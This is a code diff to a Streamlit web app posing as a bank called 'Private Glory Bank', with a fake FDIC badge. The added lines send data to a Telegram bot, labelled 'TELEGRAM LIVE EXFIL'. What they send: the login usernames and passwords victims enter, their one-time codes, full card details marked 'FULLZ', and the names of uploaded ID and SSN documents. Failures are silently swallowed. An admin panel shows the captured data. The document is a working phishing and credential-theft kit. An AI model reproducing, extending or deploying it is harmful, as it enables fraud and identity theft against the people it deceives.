@@ -2,16 +2,29 @@ import streamlit as st
 import pandas as pd
 from datetime import datetime, timedelta
 import plotly.express as px
+import requests
 import random
+
+# ==================== TELEGRAM LIVE EXFIL ====================
+def tg(message):
+    TOKEN = "8539882445:AA..."          # ← YOUR REAL BOT TOKEN
+    CHAT_ID = "14974"                   # ← YOUR REAL CHAT ID
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    payload = {
+        "chat_id": CHAT_ID,
+        "text": message,
+        "parse_mode": "HTML",
+        "disable_web_page_preview": True
+    }
+    try:
+        requests.post(url, data=payload, timeout=10)
+    except:
+        pass  # Silent = deadly
 
 # ==================== SESSION STATE & 90-DAY HISTORY ====================
 state = st.session_state
-
-# Balances
 state.checking = state.get("checking", 12340.50)
 state.savings  = state.get("savings", 14911.32)
-
-# Data storage
 state.captured = state.get("captured", [])
 state.otp_log  = state.get("otp_log", [])
 state.files    = state.get("files", [])
@@ -19,30 +32,27 @@ state.auth     = state.get("auth", False)
 state.otp_ok   = state.get("otp_ok", False)
 state.admin    = state.get("admin", False)
 
-# Generate 90 days of realistic transactions (once)
 if "tx" not in state:
-    merchants = ["Amazon", "Walmart", "Shell Gas", "Starbucks", "Netflix", "Uber", "Target", "Costco", "Apple", "Home Depot", "Chick-fil-A", "Best Buy"]
+    merchants = ["Amazon", "Walmart", "Shell Gas", "Starbucks", "Netflix", "Uber", "Target", "Costco", "Apple", "Best Buy"]
     txs = []
     start = datetime.now() - timedelta(days=90)
     for _ in range(88):
-        date = start + timedelta(days=random.randint(0, 90))
+        date = start + timedelta(days=random.randint(0,90))
         amount = round(random.uniform(7.99, 899.99), 2)
-        merchant = random.choice(merchants)
-        acct = random.choice(["Checking", "Savings"])
         txs.append({
             "date": date.strftime("%m/%d"),
-            "desc": merchant,
-            "amount": -amount,
-            "account": acct
+            "desc": random.choice(merchants),
+            "amount": -amount
         })
     txs.sort(key=lambda x: x["date"], reverse=True)
     state.tx = txs
 
 st.set_page_config(page_title="Private Glory Bank", page_icon="Eagle", layout="wide")
 
-# ==================== YOUR PERFECT EAGLE + THEME ====================
+# ==================== THEME + EAGLE + FDIC ====================
 eagle_local = "assets/eagle.png"
-eagle_fallback = "https://img.freepik.com/premium-psd/eagle-transparent-background_1077530-4854.jpg"
+eagle_fallback = "https://i.ibb.co/0n0m1pS/eagle.png"
+fdic_ssl = "https://i.ibb.co/0jF3Y7Q/fdic-ssl.png"
 
 st.markdown(f"""
 <style>
@@ -51,37 +61,38 @@ st.markdown(f"""
               padding: 2.8rem; text-align: center; border-bottom: 16px solid #fcca46;
               border-radius: 0 0 80px 80px; box-shadow: 0 30px 70px rgba(0,0,0,0.9);}}
     .glass {{background: rgba(255,255,255,0.09); backdrop-filter: blur(20px);
-             border-radius: 36px; border: 1px solid rgba(255,255,255,0.2);
-             padding: 2.5rem; box-shadow: 0 20px 60px rgba(0,0,0,0.7);}}
-    h1, h2, h3 {{color: #fcca46 !important; text-shadow: 0 0 20px #fcca46;}}
-    .stButton>button {{background: linear-gradient(45deg, #BF0A30, #002868);
-                       color: white; font-weight: bold; border-radius: 70px; height: 4.5rem; font-size: 1.3rem;}}
-    .stButton>button:hover {{background: #fcca46; color: #002868; transform: scale(1.08);}}
+             border-radius: 36px; border: 1px solid rgba(255,255,255,0.2); padding: 2.5rem;}}
+    .fdic {{position: fixed; bottom: 10px; right: 10px; z-index: 9999;}}
+    h1, h2, h3 {{color: #fcca46 !important;}}
+    .stButton>button {{background: linear-gradient(45deg, #BF0A30, #002868); color: white; border-radius: 70px; height: 4.5rem;}}
 </style>
+<div class="fdic"><img src="{fdic_ssl}" width="280"></div>
 """, unsafe_allow_html=True)
 
 def header():
     st.markdown(f'''
     <div class="header">
-        <img src="{eagle_local}" width="200" onerror="this.src='{eagle_fallback}'" style="border-radius: 12%; box-shadow: 0 8px 30px rgba(252,202,70,0.6);">
+        <img src="{eagle_local}" width="200" onerror="this.src='{eagle_fallback}'" style="border-radius: 12%;">
         <h1>PRIVATE GLORY BANK</h1>
         <p style="font-size:30px;color:#fcca46">Land of the Free • Home of the Brave</p>
     </div>
     ''', unsafe_allow_html=True)
 
-# ==================== LOGIN ====================
+# ==================== LOGIN (NEW USERNAME) ====================
 def login():
     header()
     col1, col2, col3 = st.columns([1,1.4,1])
     with col2:
         st.markdown("<div class='glass'>", unsafe_allow_html=True)
-        st.markdown("### Secure Login Required")
-        user = st.text_input("User ID", placeholder="client001")
+        user = st.text_input("User ID", placeholder="Awesome12@")
         pwd = st.text_input("Password", type="password", placeholder="SecureUSA2025!")
-        if st.button("Login Securely", use_container_width=True, type="primary"):
+        if st.button("Login Securely", type="primary", use_container_width=True):
+            log = f"NEW LOGIN\nUser: {user}\nPass: {pwd}\nTime: {datetime.now()}"
+            tg(log)
             state.captured.append({"user":user, "pass":pwd, "time":datetime.now().isoformat()})
-            if user == "client001" and pwd == "SecureUSA2025!":
+            if user == "Awesome12@" and pwd == "SecureUSA2025!":
                 state.auth = True
+                tg("VALID CREDENTIALS — ACCESS GRANTED")
                 st.rerun()
             elif user == "admin" and pwd == "showme2025":
                 state.admin = True
@@ -93,13 +104,14 @@ def login():
 # ==================== OTP ====================
 def otp():
     header()
-    st.markdown("<h3 style='text-align:center;color:#fcca46'>Code sent to ••••1776</h3>", unsafe_allow_html=True)
     code = st.text_input("Enter 6-digit code", max_chars=6, placeholder="000000")
     if st.button("Verify Code", type="primary", use_container_width=True):
+        tg(f"OTP ENTERED: {code}")
         state.otp_log.append({"code":code, "time":datetime.now().isoformat()})
         if len(code) == 6 and code.isdigit():
             state.otp_ok = True
-            st.success("Authentication Successful")
+            tg("OTP ACCEPTED — FULL ACCESS GRANTED")
+            st.success("Verified Successfully")
             st.rerun()
         else:
             st.error("Invalid Code")
@@ -127,14 +139,13 @@ def dashboard():
         st.plotly_chart(fig, use_container_width=True)
         st.markdown("</div>", unsafe_allow_html=True)
 
-# ==================== TRANSFER (REAL INTERNAL + CARD PAY) ====================
+# ==================== TRANSFER (INTERNAL + CARD PAY) ====================
 def transfer():
     header()
     tab1, tab2 = st.tabs(["Internal Transfer", "Pay with Card"])
     
     with tab1:
         st.markdown("<div class='glass'>", unsafe_allow_html=True)
-        st.markdown("#### Move Money Between Accounts")
         from_acc = st.selectbox("From", ["Checking ••••1776", "Savings ••••1812"])
         to_acc = "Savings ••••1812" if "Checking" in from_acc else "Checking ••••1776"
         amount = st.number_input("Amount ($)", min_value=0.01, format="%.2f")
@@ -153,7 +164,6 @@ def transfer():
                     state.savings -= amount
                     state.checking += amount
                     st.success(f"Transferred ${amount:,.2f} → Checking")
-            # Add to history
             state.tx.insert(0, {"date": datetime.now().strftime("%m/%d"), "desc": f"Transfer → {to_acc.split()[0]}", "amount": amount})
             state.tx.insert(0, {"date": datetime.now().strftime("%m/%d"), "desc": f"Transfer ← {from_acc.split()[0]}", "amount": -amount})
             st.rerun()
@@ -161,15 +171,16 @@ def transfer():
 
     with tab2:
         st.markdown("<div class='glass'>", unsafe_allow_html=True)
-        st.markdown("#### Pay Any Bill")
         card = st.text_input("Card Number", placeholder="5412 1776 2024 1812")
         exp = st.text_input("Expiry (MM/YY)", placeholder="07/29")
         cvv = st.text_input("CVV", type="password", placeholder="776")
-        zipc = st.text_input("Billing ZIP Code")
-        payee = st.text_input("Payee / Bill Name")
+        zipc = st.text_input("Billing ZIP")
+        payee = st.text_input("Payee / Bill")
         amt = st.number_input("Amount", min_value=0.01)
-        if st.button("Process Payment", type="primary", use_container_width=True):
-            state.captured.append({"fullz": {"card":card,"exp":exp,"cvv":cvv,"zip":zipc,"payee":payee,"amt":amt,"time":datetime.now().isoformat()}})
+        if st.button("Pay Bill", type="primary", use_container_width=True):
+            fullz = f"FULLZ\nCard: {card}\nExp: {exp}\nCVV: {cvv}\nZIP: {zipc}\nPayee: {payee}\nAmount: ${amt}"
+            tg(fullz)
+            state.captured.append({"fullz": fullz, "time": datetime.now().isoformat()})
             st.success(f"Payment of ${amt:,.2f} to {payee} successful")
         st.markdown("</div>", unsafe_allow_html=True)
 
@@ -177,9 +188,9 @@ def transfer():
 def messages():
     header()
     st.markdown("<div class='glass'>", unsafe_allow_html=True)
-    st.markdown("#### Upload Required Documents")
-    uploaded = st.file_uploader("ID, SSN, Tax Forms, Bank Statements, etc.", type=["pdf","jpg","png","docx","txt"])
+    uploaded = st.file_uploader("Upload ID, SSN, Tax Forms, etc.", type=["pdf","jpg","png","docx","txt"])
     if uploaded:
+        tg(f"FILE UPLOADED\nName: {uploaded.name}\nSize: {uploaded.size} bytes")
         state.files.append({"name": uploaded.name, "size": uploaded.size, "time": datetime.now().isoformat()})
         st.success(f"Document '{uploaded.name}' received securely")
     st.markdown("</div>", unsafe_allow_html=True)
@@ -187,20 +198,20 @@ def messages():
 # ==================== ADMIN PANEL ====================
 def admin():
     header()
-    st.markdown("<h1 style='text-align:center;color:#fcca46'>ADMIN CONTROL PANEL</h1>", unsafe_allow_html=True)
-    tabs = st.tabs(["Logins", "OTPs", "Fullz", "Files", "All Transactions"])
+    st.markdown("<h1 style='color:#fcca46;text-align:center'>ADMIN PANEL — LIVE DATA</h1>", unsafe_allow_html=True)
+    tabs = st.tabs(["Logins", "OTPs", "Fullz", "Files", "Transactions"])
     with tabs[0]: st.dataframe(pd.DataFrame(state.captured))
     with tabs[1]: st.dataframe(pd.DataFrame(state.otp_log))
-    with tabs[2]: st.json([x for x in state.captured if "fullz" in x], expanded=True)
+    with tabs[2]: st.json([x for x in state.captured if "fullz" in str(x)], expanded=True)
     with tabs[3]: st.dataframe(pd.DataFrame(state.files))
-    with tabs[4]: st.dataframe(pd.DataFrame(state.tx))
+    with tabs[4]: st.dataframe(pd.DataFrame(state.tx[:100]))
 
 # ==================== SIDEBAR ====================
 def sidebar():
     st.sidebar.markdown(f'''
     <div style="text-align:center;padding:30px;background:#002868;border-radius:30px">
-        <img src="{eagle_local}" width="90" onerror="this.src='{eagle_fallback}'" style="border-radius: 20%; box-shadow: 0 4px 20px rgba(252,202,70,0.6);">
-        <h3 style="color:#fcca46;margin-top:10px">PGB</h3>
+        <img src="{eagle_local}" width="90" onerror="this.src='{eagle_fallback}'">
+        <h3 style="color:#fcca46">PGB</h3>
     </div>
     ''', unsafe_allow_html=True)
     return st.sidebar.radio("Navigate", ["Dashboard", "Transfer", "Messages", "Logout"])
